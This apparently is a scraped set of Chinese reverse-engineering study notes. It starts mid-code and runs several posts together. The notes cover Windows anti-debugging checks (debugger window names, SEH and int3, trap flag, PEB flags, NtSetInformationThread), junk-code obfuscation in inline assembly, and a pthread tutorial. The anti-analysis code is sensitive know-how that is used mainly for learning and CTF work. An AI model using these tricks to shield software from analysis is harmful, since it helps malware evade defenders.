BOOL bDebugging = FALSE; // using ClassName if (FindWindow(L&quot;OllyDbg&quot;, NULL)||FindWindow(L&quot;TIdaWindow&quot;, NULL) ||FindWindow(L&quot;WinDbgFrameClass&quot;, NULL)) printf(&quot; 1=&gt; Found a debugger window!!! &quot;); // using WindowName bDebugging = FALSE; TCHAR szWindow_path[MAX_PATH] = &#123; 0, &#125;; HWND hWnd = GetDesktopWindow(); hWnd = GetWindow(hWnd, GW_CHILD); hWnd = GetWindow(hWnd, GW_HWNDFIRST); while (hWnd) &#123; if (GetWindowText(hWnd, szWindow_path, MAX_PATH)) &#123; if (_tcsstr(szWindow_path, L&quot;IDA&quot;) || _tcsstr(szWindow_path, L&quot;OllyDbg&quot;) || _tcsstr(szWindow_path, L&quot;WinDbg&quot;)) &#123; printf(&quot; 2=&gt; Found a debugger window!!! &quot;); break; &#125; &#125; hWnd = GetWindow(hWnd, GW_HWNDNEXT);//可能这是一个遍历 &#125;&#125;int _tmain(int argc, TCHAR* argv[])&#123; FindDebuggerWindow(); system(&quot;pause nul&quot;); return 0;&#125; IDA 1234567891011121314151617181920212223242526272829303132HWND sub_4117E0()&#123; HWND DesktopWindow; // eax HWND Window; // eax HWND result; // eax char v3; // [esp+0h] [ebp-3B8h] HWND hWnd; // [esp+190h] [ebp-228h] WCHAR String[264]; // [esp+19Ch] [ebp-21Ch] BYREF int v6; // [esp+3ACh] [ebp-Ch] __CheckForDebuggerJustMyCode(&amp;unk_41C0AC); v6 = 0; if ( FindWindowW(L&quot;OllyDbg&quot;, 0) || FindWindowW(L&quot;TIdaWindow&quot;, 0) || FindWindowW(L&quot;WinDbgFrameClass&quot;, 0) ) sub_4110D7(&quot; 1=&gt; Found a debugger window!!! &quot;, v3); v6 = 0; j_memset(String, 0, 0x208u); DesktopWindow = GetDesktopWindow(); Window = GetWindow(DesktopWindow, 5u); result = GetWindow(Window, 0); for ( hWnd = result; hWnd; hWnd = result ) &#123; if ( GetWindowTextW(hWnd, String, 260) &amp;&amp; (sub_411311(String, (wchar_t *)L&quot;IDA&quot;) || sub_411311(String, (wchar_t *)L&quot;OllyDbg&quot;) || sub_411311(String, (wchar_t *)L&quot;WinDbg&quot;)) ) &#123; return (HWND)sub_4110D7(&quot; 2=&gt; Found a debugger window!!! &quot;, v3); &#125; result = GetWindow(hWnd, 2u); &#125; return result;&#125; int3嵌入汇编引起异常 问题来了: 我安装的异常为什么是int3的解决方案???? 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;tchar.h&quot;void int3_0xCC() //IDA对这个汇编翻译不来,无法生成伟代码&#123; __asm &#123; install_SEH: push deal_with_problem\t//deal_with_problem 具体代码在下面 push DWORD ptr fs:[00] mov DWORD ptr fs:[00] , esp problem: int 3 //异常1 mov eax, 0xFFFFFFFF jmp eax //异常2 deal_with_problem: mov eax, dword ptr ss : [esp + 0xc] //eax=pconest mov ebx, remove_SEH //ebx是异常处理代码地址 mov dword ptr ds : [eax + 0xb8] , ebx //异常发生后跳转到ebx xor eax, eax retn //retn 到后面去了 remove_SEH: pop dword ptr fs : [0] add esp, 4 &#125; printf(&quot; =&gt; you see me... &quot;);&#125;int _tmain(int argc, TCHAR* argv[])&#123; puts(&quot;hello&quot;); int3_0xCC(); return 0;&#125; IDA对那段汇编的解释 12345678910111213141516171819202122232425262728; Attributes: bp-based frame; int sub_F617E0()sub_F617E0 proc nearpush ebpmov ebp, espsub esp, 0C0hpush ebxpush esipush edi ; charmov edi, ebpxor ecx, ecxmov eax, 0CCCCCCCChrep stosdint 3 ; Trap to Debuggerpush offset aYouSeeMe ; &quot; =&gt; you see me... &quot;call sub_F610D7add esp, 4pop edipop esipop ebxadd esp, 0C0hcmp ebp, espcall j___RTC_CheckEspmov esp, ebppop ebpretnsub_F617E0 endp 伪代码解释 123456int sub_F617E0()&#123; char v1; // [esp+0h] [ebp-CCh] __debugbreak(); //int3 return sub_F610D7(&quot; =&gt; you see me... &quot;, v1);&#125; 由于没有安装SEH的处理链条,所以后造成in3异常后无法调试,只能set ip 跳过 添加异常处理没看懂 1234567891011121314151617181920212223242526272829303132333435#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;tchar.h&quot;LPVOID g_pOrgFilter = NULL;LONG WINAPI ExceptionFilter(PEXCEPTION_POINTERS pExcept)&#123; SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)g_pOrgFilter); // 8900 MOV DWORD PTR DS:[EAX], EAX // FFE0 JMP EAX pExcept-&gt;ContextRecord-&gt;Eip += 4; puts(&quot;I am here&quot;); return EXCEPTION_CONTINUE_EXECUTION;&#125;void func()&#123; printf(&quot;start &quot;); g_pOrgFilter = (LPVOID)SetUnhandledExceptionFilter( (LPTOP_LEVEL_EXCEPTION_FILTER)ExceptionFilter); __asm &#123; xor eax, eax; mov dword ptr[eax], eax jmp eax // &#125; printf(&quot; =&gt; Not debugging... &quot;);&#125;int _tmain(int argc, TCHAR* argv[])&#123; func(); return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637// Test_Console_1.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;// 如果有调试器，则不会执行这个函数BOOL bIsBeinDbg = TRUE;LONG WINAPI UnhandledExcepFilter(PEXCEPTION_POINTERS pExcepPointers)&#123; bIsBeinDbg = FALSE; return EXCEPTION_CONTINUE_EXECUTION;&#125;int main()&#123; // 注册异常处理函数 LPTOP_LEVEL_EXCEPTION_FILTER Top = SetUnhandledExceptionFilter(UnhandledExcepFilter); // 主动抛出一个异常 RaiseException(EXCEPTION_FLT_DIVIDE_BY_ZERO, 0, 0, NULL); if (bIsBeinDbg == TRUE) &#123; printf(&quot;发现调试器 &quot;); &#125; else &#123; printf(&quot;没有调试器！ &quot;);; &#125;main_end: return 0;&#125; 时间记录器12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;tchar.h&quot;void func()&#123;\tDWORD dwDelta = 0;\tprintf(&quot;Timing Check&quot;);\t__asm &#123; pushad ; -------------------------------------------------------- rdtsc //这里就会把t0计入寄存器 push edx push eax\t//把获取的书籍放入栈中 ; ------------------------------ xor eax, eax\t//eax从0开始累计1,到0x3e8 mov ecx, 1000 //一个循环的次数 time_spend: inc eax loop time_spend ; ------------------------------ rdtsc //记录一下t1 pop esi\t// eax pop edi\t// edx ; -----------------------------------(t1)edx:eax - (t0)edi:esi cmp edx, edi ja you_are_debugging //如果存在很大的时间差,肯定就在调试,这是比较高位的原因 sub eax, esi //比较低位, cmp eax, 0xffffff jb no_one_debugging //如果时间差很小.就是正常运行 //发现你在调试,就故意引发了一个异常 you_are_debugging: xor eax, eax mov[eax], eax // debugger not found no_one_debugging : popad\t&#125;&#125;int _tmain(int argc, TCHAR* argv[])&#123;\tfunc();\treturn 0;&#125; IDA的翻译 1234567891011121314151617181920212223242526__int64 sub_4117A0()&#123; __int64 v0; // rax int accumulation; // eax int count; // ecx unsigned __int64 end; // rax unsigned __int64 start; // [esp-28h] [ebp-100h] __int64 v6; // [esp-20h] [ebp-F8h] char v7; // [esp+0h] [ebp-D8h] LODWORD(v0) = sub_4110D2(&quot;Timing Check&quot;, v7); v6 = v0; start = __rdtsc(); accumulation = 0; count = 0x3E8; do &#123; ++accumulation; --count; &#125; while ( count ); end = __rdtsc(); if ( HIDWORD(end) &gt; HIDWORD(start) || (unsigned int)(end - start) &gt;= 0xFFFFFF ) MEMORY[0] = 0; return v6;&#125; 破解的方法很多 1.不用f7,用f2+f9 2.修改最后的计算结果 3.操作跳转指令 单步执行异常TF trap_flagTrap Flag（陷阱标识）位于EFLAGS寄存器内，如果TF设置为1， CPU将在每个指令执行后产生INT 01h或单步异常(single-step exception)。 以下就是基于TF设置和异常调用检查的反调试 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;tchar.h&gt;#include &lt;stdlib.h&gt;void DynAD_SingleStep()&#123; printf(&quot;Trap Flag (Single Step) &quot;); __asm &#123; install_SEH: push handler push DWORD ptr fs : [0] mov DWORD ptr fs : [0] , esp pushfd //把所有的寄存器入栈 or dword ptr ss : [esp] , 0x100 //对栈中寄存器的数据做一个修改 popfd //把栈中修改的数据放入寄存器 nop //触发异常 这个异常如果不解决的话,IDA会崩溃退出 mov eax, 0xFFFFFFFF jmp eax handler : mov eax, dword ptr ss : [esp + 0xc] mov ebx, remove_SEH mov dword ptr ds : [eax + 0xb8] , ebx xor eax, eax retn remove_SEH : pop dword ptr fs : [0] add esp, 4 &#125; printf(&quot; Not debugging... &quot;);&#125;int main(int argc, TCHAR* argv[])&#123; DynAD_SingleStep(); puts(&quot;hELLO WorLD&quot;); return 0;&#125; 解决办法是设置OD的调试选项, 这还不如直接patch掉它 作者写的代码,运行有问题 1234567891011121314151617181920212223242526272829303132333435363738#define _CRT_SECURE_NO_WARNINGS#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;tchar.h&gt;#include&lt;stdlib.h&gt;void test()&#123; BOOL isDebugged = TRUE; __try &#123; __asm &#123; pushfd or dword ptr[esp], 0x100 // set the Trap Flag popfd // Load the value into EFLAGS register nop &#125; &#125; __except (EXCEPTION_EXECUTE_HANDLER) &#123; // If an exception has been raised – debugger is not present isDebugged = FALSE; &#125; if (isDebugged) &#123; printf(&quot;Stop debugging program!&quot;); exit(-1); &#125;&#125;int main(int argc, TCHAR* argv[])&#123; test(); puts(&quot;hELLO WorLD&quot;); return 0;&#125; int 2D 忽略后一个字节1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;tchar.h&quot;void DynAD_INT2D()&#123; BOOL bDebugging = FALSE; __asm &#123; install_SEH: push handler push DWORD ptr fs : [0] mov DWORD ptr fs : [0] , esp //-------------------------- int 0x2d nop //-------------------------- mov bDebugging, 1 jmp remove_SEH handler : mov eax, dword ptr ss : [esp + 0xc] mov dword ptr ds : [eax + 0xb8] , offset remove_SEH mov bDebugging, 0 xor eax, eax retn remove_SEH: pop dword ptr fs : [0] add esp, 4 &#125; if (bDebugging) printf(&quot; =&gt; Debugging!!! &quot;); else printf(&quot; =&gt; Not debugging... &quot;);&#125;int _tmain(int argc, TCHAR* argv[])&#123; DynAD_INT2D(); system(&quot;pause nul&quot;); return 0;&#125; 0xCC 断点检测字节码扫描不要在第一个位置设置断点就好,在后面一个字节设置断点 比较检验和在0xcc之前会有指令的字节和 在设置了0xcc后也会有指令的检验和,2者之间做一个比较就知道你有没有debug 问题: 在我设置了0xcc后,无论静态查看还是动态的调试都会计入0xcc吗?我在动态调试中 设置断点,那么的话你一直记录的都是0xcc,这不是也避免了吗?? 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;tchar.h&quot;DWORD g_dwOrgChecksum = 0xF5934986;int _tmain(int argc, TCHAR* argv[]);void DynAD_Checksum()&#123; BOOL bDebugging = FALSE; DWORD count = 0; __asm &#123; mov ecx, offset _tmain mov esi, offset DynAD_Checksum sub ecx, esi // ecx : loop count (buf size) xor eax, eax // eax : checksum xor ebx, ebx _CALC_CHECKSUM : movzx ebx, byte ptr ds : [esi] add eax, ebx rol eax, 1 inc esi loop _CALC_CHECKSUM cmp eax, g_dwOrgChecksum je _NOT_DEBUGGING mov bDebugging, 1 _NOT_DEBUGGING: &#125; if (bDebugging) printf(&quot; =&gt; Debugging!!! &quot;); else printf(&quot; =&gt; Not debugging... &quot;);&#125;int _tmain(int argc, TCHAR* argv[])&#123; DynAD_Checksum(); return 0;&#125; 破解方法就似乎修改跳转吧 其中我发现了游戏额字节区域它不让你访问,于是就发生了异常 加密解密 SM4类似于对你的机器码去加密 代码重组可能就是中途对你的机器马做一个加减运算 1234 mov ebx,offset ok1 inc byte ptr ds:[ebx]ok1: jz ok2 于是jz指令就被jnc修改为了jnz指令,两者相差1 如果你对某些位置下了0xCC断点,然后使用上面的操作会引起错误 remove oep我不知道书上说了些啥应该说的对exe的一个压缩与解压缩 API重定向没看懂书上的例子 … Debug Bolcker&#x2F;Self debugging12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;tchar.h&quot;#include &lt;stdlib.h&gt;#include &lt;shellapi.h&gt;void fuck()&#123; LPCSTR mode = &quot;open&quot;; LPCSTR web = &quot;https://www.bilibili.com/video/BV1Mh41147yo?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click&quot;; ShellExecuteA(NULL, mode, web, NULL, NULL, SW_SHOW); exit(-1); return;&#125;void PEB()&#123; HMODULE hMod = NULL; FARPROC Process_far_proc = NULL; LPBYTE pTEB = NULL; LPBYTE PEB_p = NULL; BOOL bIsDebugging = FALSE; HMODULE tmp = NULL; //-------------------------------------------------------------------------- if (IsDebuggerPresent()) &#123; printf(&quot;你在作弊-DebuggerPresent&quot;); fuck(); &#125; tmp = GetModuleHandle(L&quot;ntdll.dll&quot;); if (tmp == NULL) exit(-1); Process_far_proc = GetProcAddress( tmp,&quot;NtCurrentTeb&quot;); pTEB = (LPBYTE)(*Process_far_proc)(); // 函数(*Process_far_proc)(),返回值强制转化(LPBYTE) PEB_p = (LPBYTE) * (LPDWORD)(pTEB + 0x30); // address of PEB //-------------------------------------------------------------------------- LPBYTE Heap_p = (LPBYTE) * (LPDWORD)(PEB_p + 0x18); DWORD Flags_dw = *(LPDWORD)(Heap_p + 0xC); if (Flags_dw != 0x2) &#123; printf(&quot;Flags =&gt; Debugging!!! &quot;); fuck(); &#125; DWORD ForceFlags_dw = *(LPDWORD)(Heap_p + 0x10); if (ForceFlags_dw != 0x0) &#123; printf(&quot;ForceFlags =&gt; Debugging!!! &quot;); fuck(); &#125; //-------------------------------------------------------------------------NtGlobalFlag DWORD NtGlobalFlag_dw = *(LPDWORD)(PEB_p + 0x68); if ((NtGlobalFlag_dw &amp; 0x70) == 0x70)//如果0&amp;任何数是0.不会进入 &#123; printf(&quot; NtGlobalFlag=&gt; Debugging!!! &quot;); fuck(); &#125;&#125;int _tmain(int argc, TCHAR* argv[])&#123; PEB(); system(&quot;pause nul&quot;); return 0;&#125; NtSetInformationThread123456__kernel_entry NTSYSCALLAPI NTSTATUS NtSetInformationThread( [in] HANDLE ThreadHandle, //装备插件线程对象的句柄 [in] THREADINFOCLASS ThreadInformationClass, [in] PVOID ThreadInformation, [in] ULONG ThreadInformationLength); 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;// 反调试函数void HideFromDebugger() &#123;\tDWORD tmp1 = 0;\tDWORD tmp2 = 0;\tHMODULE hNtDll = LoadLibrary(&quot;ntdll.dll&quot;);\tif (hNtDll)\t&#123; tmp1 = (DWORD)GetProcAddress(hNtDll, &quot;NtSetInformationThread&quot;); tmp2 = GetCurrentThread(); _asm &#123; push 0 push 0 push 0x11 push tmp2 call tmp1 &#125;\t&#125;\treturn 0;&#125;// 线程函数void myThread() &#123;\tHideFromDebugger();\twhile (1) &#123; printf(&quot;Hell0 &quot;); Sleep(1000);\t&#125;&#125;int main()&#123;\tmyThread();\treturn 0;&#125;","tags":["Windows","Anti_Dbg"],"categories":["Reverse"]},{"title":"反调试原理","path":"/re4mile/2021/06/07/re/反调试/tool/re/","content":"参考链接看雪 SSH山水画师傅的https://bbs.pediy.com/thread-266408.htm 反IDA这是南邮CTF WxyVM2出现的一次IDA反编译故障,原因就是代码量太多,2万行 IDA直接放弃了 看wp,说需要修改IDA配置文件 1xxx\\IDA Pro 7.6\\cfg\\hexrays.cfg 把文本内容MAX_FUNCSIZE= 64修改MAX_FUNCSIZE= 1024 我觉得,这也算得上是一个反调试的方法,而且很少有人可以解除,虽然手段有点低级","tags":["AntiDbg"],"categories":["Reverse"]},{"title":"反调试小结","path":"/re4mile/2021/06/07/re/反调试/总结/re/","content":"参考链接https://www.intelligent-trans.cn/archives/227/","tags":["Anti_Dbg"],"categories":["Reverse"]},{"title":"C语言的花指令","path":"/re4mile/2021/06/07/re/花指令/Intel/re/","content":"exe我们不应该垃圾代码不仅仅起着一个混淆的作用 因为一旦nop后,垃圾代码就不再起作用.我们应该 1). 让垃圾代码参与加密和运算,你的垃圾代码甚至可以是一堆字符串,用于加密 2). 让垃圾代码和有效代码加密挨着,穿插运行(不知道如何实现) 3). 基于跳转无条件跳转jmp 无符号跳转above&#x2F;below 助记符 说明 JA&#x3D;JNBE &gt; CF|ZF&#x3D;0 JB&#x3D;JNAE &lt; CF&#x3D;1 JAE&#x3D;JNB &gt;&#x3D; CF&#x3D;0 JNA&#x3D;JBE &lt;&#x3D; CF|ZF&#x3D;1 STC 让CF&#x3D;1 : JB CLC 让CF&#x3D;0 : JNB 其实细节的话,还得学习和复习一下汇编 有符号跳转greate&#x2F;little 助记符 说明 JG&#x3D;JNLE &gt; (SF ^OF)|ZF&#x3D;0 JL&#x3D;JNGE &lt; SF^OF&#x3D;1,意思SF &#x3D; OF JGE&#x3D;JNL &gt;&#x3D; SF ^ OF&#x3D;0,意思是SF! &#x3D; OF JLE&#x3D;JNG &lt;&#x3D; (SF^OF)|ZF&#x3D;1 eip跳转修改eip的方式 1234//加入SS:[ESP]=EIPpop eaxadd eax,8push eax 1add ss:[esp],8 12345678910 call label1; _emit JunkCode;label1: call label2; _emit JunkCode;label2: call label3; _emit JunkCode;label3:\tadd esp,xxx; //恢复栈的正常 实例简单跳转junk_code的构造显得很重要 12345_asm&#123; jmp LABEL1 _emit 0xE8; //junk_code LABEL1:&#125; 基于互补条件的跳转 123456_asm&#123; jz LABEL1 jnz LABEL1 db junk_code LABEL1:&#125; 布尔永真1234567891011121314151617181920212223#include&lt;stdio.h&gt;#include&lt;Windows.h&gt;int main()&#123;\tint a = 10;\tLoadLibrary(&quot;...&quot;);//函数返回值存储于eax中\t//用确定性构造不确定性\t__asm &#123; cmp eax, 0; jb LABEL_CanNotBe_1; jnb LABEL_MustBe_1;LABEL_CanNotBe_1: push eax; add esp,0x100; pop esp; mov dword ptr [ebp+ecx*4+2],ebx; _emit 0xE8;LABEL_MustBe_1:\t&#125;\tprintf(&quot;__%d&quot;, a);&#125; 修改eip1) 一般的修改栈的eip12345678910111213141516171819#include&lt;stdio.h&gt;int main()&#123; int a = 10; __asm &#123; call LABEL9; _emit 0x83; //从这里开始加8个字节就是a = 3 //占1个字节, LABEL9: add dword ptr ss : [esp] , 8; //占5个字节 ret; //占1个字节 __emit 0xF3; //占1个字节 &#125; a = 3; printf(&quot;Dqx-&gt;%d&quot;, a);&#125; 2) 无限call不ret-x112345678910111213141516171819202122#include&lt;stdio.h&gt;int main()&#123; int a = 10; __asm &#123; push eax call LABEL1 _emit 29h //ip1 _emit 5AhLABEL1 : POP eax imul eax, 3 call LABEL2 db junkCodeLABEL2 : //[esp]=ip2,[esp-4]=eax add esp, 4 //[esp]=eax pop eax &#125; printf(&quot;Flower_Dqx-&gt;%d&quot;, a);&#125; 3) 无限call不ret-x2123456789 call LABEL1 db 0E8hLABEL2: jmp LABEL3 db junk_codeLABEL1: :call LABEL2LABEL3: add esp,8 4) 裸函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include&lt;stdio.h&gt;void example5(int* a);int main()&#123; int a = 10; example5(&amp;a); printf(&quot;Flower_Dqx-&gt;%d&quot;, a);&#125;//extern &quot;C&quot; __declspec(naked) void func()void __declspec(naked)__cdecl example5(int* a)//naked裸函数，开辟和释放堆栈由我们自己写。&#123;//55 8b ec 83 __asm &#123; push ebp mov ebp, esp sub esp, 0x40 push ebx push esi push edi mov eax, 0xCCCCCCCC mov ecx, 0x40 lea edi, dword ptr ds : [ebp - 0x40] rep stos dword ptr es : [edi] &#125; *a = 5; __asm &#123; call LABEL9; _emit 0xE8; _emit 0x01; _emit 0x00; _emit 0x00; _emit 0x00; LABEL9: push eax; push ebx; lea eax, dword ptr ds : [ebp - 0x0] ; //将ebp的地址存放于eax add dword ptr ss : [eax - 0x50] , 26; //该地址存放的值正好是函数返回值， 26是垃圾代码的长度 //不过该地址并不固定，根据调试所得。加26正好可以跳到下面的mov指令，该值也是调试计算所得 pop eax; pop ebx; pop eax;//把修改的ip给pop出来了 jmp eax; __emit 0xE8; _emit 0x03; _emit 0x00; _emit 0x00; _emit 0x00; mov eax, dword ptr ss : [esp - 8] ; //将原本的eax值返回eax寄存器 为什么是esp-8 也是通过实践得到的 //esp-8 是什么数据 是之前压入栈push eax的数据,虽然pop了2次,但是栈中的数据还是在那里,没有修改 //用来废弃的栈数据 &#125; __asm &#123; pop edi pop esi pop ebx mov esp, ebp pop ebp ret &#125;&#125; 为什么是 1add dword ptr ss : [eax - 0x50] , 26 0x50当中0x40是开辟的栈空间 0x10是我们push了4次 为什么是0x50,而不是0x4C或者0x54 这样比喻 1 –&gt; 9 1+8&#x3D;9 所以0x50就相当于那个8 为什么是26 26是其中的垃圾代码长度 为什么 是esp,为什么是esp-8 1mov eax, dword ptr ss : [esp - 8] 为什么是esp? 通过esp可以寻找废弃的栈空间 为什么是esp-8的-8 1call LABEL9; 这个函数我们没有开辟栈空间 我们把函数在对变量a时候 eax&#x3D;a的地址 然后我们又push2次,pop3次 笨啦esp–4就是原来push &amp;a的数据 但是我们pop了33次,导致esp-8才是&amp;a的数据 在函数 call LABEL9;中,我们先打破了堆栈平衡 函数确定的返回值 一点都没有用的垃圾代码保存修改再还原 12345678910111213141516int main()&#123; _asm &#123; pushad mov eax,16 rol eax, 14 rol eax, 18 mov eax,16 rol eax,32 xchg edx,edx xchg edx,edx popad &#125; return 0;&#125; 恒等运算 与自己xchg,mov 12xchg esp,espmov esp,esp ELF基于我现有的一点点intel语法,无法自由的在gcc下编译 编译选项 1gcc xxx -masm=intel xxx 基于互补条件的跳转 1234567891011asm( &quot;.intel_syntax noprefix;&quot; &quot;jnz $+5;;&quot; &quot;jz $+3;&quot; &quot;push rax;&quot;\t//这里需要把一字节的指令push rax 修改为其它垃圾指令,比如0xE8);//上面的跳转始终会来到这里for (idex = 0; idex &lt; 16 &amp;&amp; booklist[idex]; idex++)&#123;\tArr[i]=Arr[i]^0x10;&#125; 基于eflag的永真跳转 1234567asm( &quot;.intel_syntax noprefix;&quot; &quot;stc;&quot; &quot;jc $+3;&quot; //该指令占用2字节,下面的push rax占1字节 &quot;push rax;&quot;\t//这里需要把一字节的指令push rax 修改为其它垃圾指令,比如0xE8);bookname[idex] = ptr;//上面的跳转始终会来到这里 基于eflag的永真跳转 1234567891011if (*(booklist[idex] + j) == &#x27; &#x27;)&#123; asm( &quot;.intel_syntax noprefix;&quot; &quot;clc;&quot; &quot;jnc $+3;&quot; //83 &quot;push rax;&quot; ); *(booklist[idex] + j) = 0; break;&#125; 基于修改eip的跳转 123456789101112131415for (j = 0; j &lt; size; ++j)&#123; read(0, booklist[idex] + j, 1); asm( &quot;.intel_syntax noprefix;&quot; &quot;call $+6;&quot; &quot;push rax;&quot; //83 &quot;pop rax;&quot; &quot;add rax,9;&quot; &quot;push rax;&quot; &quot;ret;&quot; &quot;push rax;&quot; //F3 );&#125;","tags":["AntiDbg"],"categories":["Reverse"]},{"title":"进程和线程","path":"/re4mile/2021/06/07/re/进程线程/基础/re/","content":"Cpp多线程是多任务处理的一种特殊形式，多任务处理允许让电脑同时运行两个或两个以上的程序。 一般情况下，两种类型的多任务处理：基于进程和基于线程。 基于进程的多任务处理是&#x3D;&#x3D;程序的并发执行&#x3D;&#x3D;。 基于线程的多任务处理是&#x3D;&#x3D;同一程序的片段的并发执行&#x3D;&#x3D;。 多线程程序包含可以同时运行的两个或多个部分。 这样的程序中的每个部分称为一个线程，每个线程定义了一个单独的执行路径。 数据类型pthread_t 教程ID创建 pthread_attr_t 可连接线程的ID 创建线程12#include &lt;pthread.h&gt;pthread_create (thread, attr, start_routine, arg) 在这里，pthread_create 创建一个新的线程，并让它可执行。下面是关于参数的说明： 参数 描述 thread 指向线程标识符指针。 attr 一个不透明的属性对象，可以被用来设置线程属性。您可以指定线程属性对象，也可以使用默认值 NULL。 start_routine 线程运行函数起始地址，一旦线程被创建就会执行。 arg 运行函数的参数。它必须通过把引用作为指针强制转换为 void *类型进行传递。如果没有传递参数，则使用 NULL。 创建线程成功时，函数返回 0，若返回值不为 0 则说明创建线程失败。 终止线程12#include &lt;pthread.h&gt;pthread_exit (status) 在这里，pthread_exit 用于显式地退出一个线程。 通常情况下，pthread_exit() 函数是在&#x3D;&#x3D;线程完成工作后无需继续存在&#x3D;&#x3D;时被调用。 如果 main() 是在它所创建的线程之前结束，并通过 pthread_exit() 退出，那么其他线程将继续执行。否则，它们将在 main() 结束时自动被终止???????????????? 不带参数 1234567891011121314151617181920212223242526#include &lt;iostream&gt;// 必须的头文件#include &lt;pthread.h&gt; using namespace std;// 线程的运行函数void* speak(void* args)&#123;\tcout&lt;&lt;&quot;Hello GoodBye&quot; &lt;&lt; endl;\treturn NULL;&#125; int main()&#123; // 定义线程的 id 变量，多个变量使用数组 pthread_t ID[5]; for(int i = 0; i &lt; 5; ++i) &#123; //参数依次是：创建的线程id，线程参数，调用的函数，传入的函数参数 int ret = pthread_create(&amp;ID[i], NULL, speak, NULL); if (ret != 0) cout &lt;&lt; &quot;教程创建失败&quot; &lt;&lt; endl; &#125; //等各个线程退出后，进程才结束，否则进程强制结束了，线程可能还没反应过来； pthread_exit(NULL);&#125; 带参数 1234567891011121314151617181920212223242526272829303132333435//文件名：test.cpp #include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;pthread.h&gt; using namespace std;void *speak(void *F_ID)&#123; // 对传入的参数进行强制类型转换，由无类型指针变为整形数指针，然后再读取\tint S_ID = *((int*)F_ID);\tprintf(&quot;Say GoodByte 线程 ID: %d &quot;,S_ID);\tpthread_exit(NULL);&#125; int main ()&#123; pthread_t ID[5]; int index[5];// 用数组来保存i的值 int ret; int i; for( i=0; i &lt; 5; i++ ) &#123; printf(&quot;main()-&gt;创建线程: %d &quot;,i); index[i] = i; // 传入的时候必须强制转换为void* 类型，即无类型指针 ret = pthread_create(&amp;ID[i], NULL, speak, (void *)&amp;(index[i])); if (ret) &#123; cout &lt;&lt; &quot;Error:无法创建线程,&quot; &lt;&lt; ret &lt;&lt; endl; exit(-1); &#125; &#125; pthread_exit(NULL);&#125; 利用数据结果传递多个信息 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;pthread.h&gt; using namespace std; #define max 5 struct my_data&#123; int my_id; char *message;&#125;; void *Speak(void *my_arg)&#123; struct my_data *b_data; b_data = (struct my_data *) my_arg; cout &lt;&lt; &quot; my ID : &quot; &lt;&lt; b_data-&gt;my_id ; cout &lt;&lt; &quot; Message : &quot;&lt;&lt; b_data-&gt;message &lt;&lt; endl; pthread_exit(NULL);&#125; int main ()&#123; pthread_t xc[max]; struct my_data st_message[max]; int ret; int i; for( i=0; i &lt; max; i++ ) &#123; cout &lt;&lt;&quot;main() 线程创建: &quot; &lt;&lt; i &lt;&lt; endl; st_message[i].my_id = i; st_message[i].message = (char*)&quot;Gh0st&quot;; ret = pthread_create(&amp;xc[i], NULL, Speak, (void *)&amp;st_message[i]); if (ret) &#123; cout &lt;&lt; &quot;Error:unable to create thread,&quot; &lt;&lt; ret &lt;&lt; endl; exit(-1); &#125; &#125; pthread_exit(NULL);&#125; 线程连接与分离可连接的（joinable） 可分离的（detached） 只有创建时定义为可连接的线程才可以被连接。如果线程创建时被定义为可分离的，则它永远也不能被连接。 12pthread_join (threadid, status) pthread_detach (threadid) pthread_join() 子程序阻碍调用程序，直到指定的 threadid 线程终止为止 12pthread_attr_init(&amp;attr);//线程初始化 参数 变量地址pthread_attr_setdetachstate(&amp;attr, PTHREAD_CREATE_JOINABLE);//创建可连接线程 参数1 变量地址 参数2 内部编号 没看懂啥意思 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include &lt;cstdlib&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt; using namespace std; #define NUM_THREADS 5 void *wait(void *t)&#123; int i; int tid; tid = *((int*)t); cout &lt;&lt; &quot;kill 线程ID : &quot; &lt;&lt; tid &lt;&lt; &quot; exiting &quot; &lt;&lt; endl; pthread_exit(NULL);//这是在杀死线程???? &#125; int main ()&#123; int rc; int i; pthread_t threads[NUM_THREADS]; pthread_attr_t attr; void *status; // 初始化并设置线程为可连接的（joinable） pthread_attr_init(&amp;attr); pthread_attr_setdetachstate(&amp;attr, PTHREAD_CREATE_JOINABLE); for( i=0; i &lt; NUM_THREADS; i++ ) &#123; cout &lt;&lt; &quot;main() : 线程创建 &quot; &lt;&lt; i &lt;&lt; endl; rc = pthread_create(&amp;threads[i], NULL, wait, (void *)&amp;i ); if (rc) &#123; cout &lt;&lt; &quot;Error:unable to create thread,&quot; &lt;&lt; rc &lt;&lt; endl; exit(-1); &#125; &#125; // 删除属性，并等待其他线程 pthread_attr_destroy(&amp;attr); for( i=0; i &lt; NUM_THREADS; i++ ) &#123; rc = pthread_join(threads[i], &amp;status); if (rc) &#123; cout &lt;&lt; &quot;Error:unable to join,&quot; &lt;&lt; rc &lt;&lt; endl; exit(-1); &#125; cout &lt;&lt; &quot;Main:线程完毕 :&quot; &lt;&lt; i ; cout &lt;&lt; &quot;main 退出 :&quot; &lt;&lt; status &lt;&lt; endl; &#125; 